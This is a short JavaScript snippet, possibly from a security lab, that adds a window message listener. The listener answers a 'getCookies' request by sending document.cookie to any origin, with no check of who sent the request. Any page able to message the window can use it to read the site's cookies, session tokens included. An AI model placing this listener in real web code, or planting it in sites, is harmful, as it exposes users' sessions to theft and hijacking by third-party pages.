window.addEventListener("message", (e) => {
  if (e.data == "getCookies") {
    e.source.postMessage({"cookies": document.cookie}, '*');
  }
});